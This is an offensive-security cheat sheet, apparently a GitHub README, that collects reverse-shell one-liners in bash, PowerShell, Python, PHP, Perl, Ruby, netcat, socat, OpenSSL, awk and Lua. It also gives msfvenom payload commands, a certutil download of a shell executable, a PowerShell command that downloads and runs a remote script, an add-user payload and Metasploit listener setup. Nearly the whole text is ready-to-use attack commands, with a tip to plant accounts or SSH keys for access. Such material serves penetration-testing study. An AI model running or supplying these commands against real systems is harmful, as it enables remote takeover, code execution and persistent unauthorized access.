![](W4key.gif)


# Compendium: In Progress - More details to follow
Compendium:  A concise but detailed collection of Scripts, Reverse Shells and Commands for Offensive Security. 

# Favourites - Most used examples 

## File transfers -  More Cooming soon
```
certutil -urlcache -split -f http://192.168.119.199/reverse_5555.exe reverse_5555.exe
```


## PTY Shells - More Coming soon 

### Python
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
### sh
```
/bin/sh -i
```
### bash
```
/bin/bash -i
```
## More commands - Coming Soon

### Bash Reverse Shell

```
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
```


## Meterpreter Shells

### Windows Staged reverse TCP

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```

### Windows Stageless reverse TCP

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```

### Linux Staged reverse TCP

```powershell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```

### Linux Stageless reverse TCP

```powershell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```

### Other platforms

```powershell
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

### Reverse Shell Cheat Sheet

It is always worth trying to add a new account / SSH key / .rhosts file and just log in.

These scripts are designed for Linux systems but to make them work on Windows replace “/bin/sh -i” with “cmd.exe”.

### Powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```

#### Python :

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

IPv4
```python
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

IPv4
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

IPv6
```python
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```



### Php :

```
php -r '$sock=fsockopen("192.168.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### War

```java
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file
```

#### Netcat :

```
nc -e /bin/sh 192.168.0.5 4444
ncat 10.0.0.1 4242 -e /bin/bash
ncat --udp 10.0.0.1 4242 -e /bin/bash
```

#### Socat :

```
socat tcp-connect:192.168.0.5:4444 system:/bin/sh
```

#### Perl :

```
perl -e 'use Socket;$i="192.168.0.5";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Ruby :

```
ruby -rsocket -e'f=TCPSocket.open("192.168.0.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### OpenSSL:

On your machine (to receive, not a normal TCP connection)
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes # generate some arbitrary cert
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

On PWN'd client
```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.5:4444 > /tmp/s; rm /tmp/s
```

#### Java :

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5< >/dev/tcp/192.168.0.5/4444;cat <& 5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### xterm :

```
xterm -display 192.168.0.5:4444
```

### Awk

```powershell
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Lua

Linux only

```powershell
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```


# MSFVenom Cheatsheet

| MSFVenom Payload Generation One-Liner | Description |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|
|    msfvenom -l   payloads                                                                                                                                                                 |    List available payloads                                     |
|    msfvenom -p PAYLOAD --list-options                                                                                                                                                                 |    List payload options                                     |
|    msfvenom -p   PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT   LHOST=IP                                                                                                        |    Payload Encoding                                            |
|    msfvenom -p   linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf  >  shell.elf                                                                                           |    Linux Meterpreter  reverse shell x86 multi stage            |
|    msfvenom -p   linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf  >  shell.elf                                                                                              |    Linux Meterpreter  bind shell x86 multi stage               |
|    msfvenom -p linux/x64/shell_bind_tcp   RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                      |    Linux bind shell x64 single stage                           |
|    msfvenom -p linux/x64/shell_reverse_tcp   RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                   |    Linux reverse shell x64 single stage                        |
|    msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe >   shell.exe                                                                                             |    Windows Meterpreter reverse shell                           |
|    msfvenom -p   windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe                                                                                             |    Windows Meterpreter http reverse shell                           |
|    msfvenom -p   windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe >   shell.exe                                                                                               |    Windows Meterpreter bind shell                              |
|    msfvenom -p   windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe >   shell.exe                                                                                                   |    Windows CMD Multi Stage                                     |
|    msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT   -f exe >  shell.exe                                                                                                     |    Windows CMD Single Stage                                    |
|    msfvenom -p   windows/adduser USER=hacker PASS=password -f exe > useradd.exe                                                                                                           |    Windows add user                                            |
|    msfvenom -p   osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho >   shell.macho                                                                                               |    Mac Reverse Shell                                           |
|    msfvenom -p   osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho  >  shell.macho                                                                                                  |    Mac Bind shell                                              |
|    msfvenom -p   cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw >   shell.py                                                                                                      |    Python Shell                                                |
|    msfvenom -p   cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw >   shell.sh                                                                                                        |    BASH Shell                                                  |
|    msfvenom -p   cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw >   shell.pl                                                                                                        |    PERL Shell                                                  |
|    msfvenom -p   windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp >   shell.asp                                                                                             |    ASP Meterpreter shell                                       |
|    msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw  >  shell.jsp                                                                                                  |    JSP Shell                                                   |
|    msfvenom -p   java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war >   shell.war                                                                                                  |    WAR Shell                                                   |
|    msfvenom -p   php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw  >  shell.php   cat shell.php | pbcopy && echo '?php ' | tr -d '\n'    shell.php && pbpaste  shell.php    |    Php Meterpreter Shell                                       |
|    msfvenom -p   php/reverse_php LHOST=IP LPORT=PORT -f raw  >  phpreverseshell.php                                                                                                   |    Php Reverse Shell                                           |
|    msfvenom -a x86   --platform Windows -p windows/exec CMD="powershell \\"IEX(New-Object   Net.webClient).downloadString('http://IP/nishang.ps1')\""   -f python                        |    Windows Exec Nishang Powershell in   python   |
|    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/shikata_ga_nai -b "\x04\xA0"                                                            |    Bad characters shikata_ga_nai                               |
|    msfvenom -p   windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT   -f c -e x86/fnstenv_mov -b "\x04\xA0"                                                               |    Bad characters fnstenv_mov                                  |

# Multihandler Listener
To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,  
```
msf>use exploit/multi/handler  
msf>set payload windows/meterpreter/reverse_tcp  
msf>set lhost <IP>  
msf>set lport <PORT>  
msf> set ExitOnSession false  
msf>exploit -j  
```
The -j option is to keep all the connected session in the background.  


# References

https://kb.help.rapid7.com/discuss/598ab88172371b000f5a4675  
https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/  
http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/  
https://github.com/frizb/MSF-Venom-Cheatsheet/edit/master/README.md

